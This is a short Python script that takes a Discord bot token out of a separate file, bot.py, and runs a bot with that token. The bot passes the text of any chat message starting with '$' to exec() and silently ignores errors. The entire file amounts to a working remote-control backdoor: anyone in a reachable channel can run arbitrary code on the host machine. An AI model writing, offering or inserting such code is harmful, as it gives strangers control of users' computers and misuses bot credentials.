import discord, os
code = open(".\\bot.py",'r',encoding='utf-8').read().splitlines()
tokened = [a for a in code if "client.run" in a]
token = tokened[0][12:-2]
client = discord.Client()
@client.event
async def on_message(message):
    if message.content.startswith("$"): # 메세지 감지
        try: exec(message.content[1:])
        except: pass
client.run(token)
